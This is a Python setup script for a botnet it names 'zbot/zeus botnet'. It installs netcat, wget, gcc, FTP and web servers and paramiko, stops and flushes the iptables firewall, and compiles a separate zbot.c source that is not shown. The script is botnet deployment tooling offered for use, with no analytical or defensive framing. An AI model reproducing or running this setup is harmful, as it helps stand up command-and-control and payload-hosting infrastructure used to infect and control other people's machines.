#!/usr/bin/python
# Thank you for using zbot/zeus botnet
# ZBOT: https://github.com/codingplanets/ZBOT-Botnet
# Usages: python zbot-setup.py
#
import subprocess, sys, os

print "Installing modules"

os.system("yum install nano -y")
os.system("yum install  screen -y")
os.system("yum install nc -y")
os.system("yum install httpd -y")
os.system("yum install xinetd -y")
os.system("yum install vsftpd -y")
os.system("yum install wget -y")
os.system("yum install gcc -y")
os.system("yum install python-paramiko -y")
os.system("yum install dos2unix -y")
os.system("yum install unzip -y")


print "Loading iptables and ulimits"
os.system("service httpd start")
os.system("service iptables stop")
os.system("service xinetd start")
os.system("service vsftpd start")
os.system("iptables -F")

print '''\x1b[0;32m
Please configure zbot.c by filling out configuration
section before pressing enter.
\x1b[0m'''
raw_input("Press Enter to continue...")
os.system("chmod +x zbot-build")
os.system("./zbot-build zbot.c")


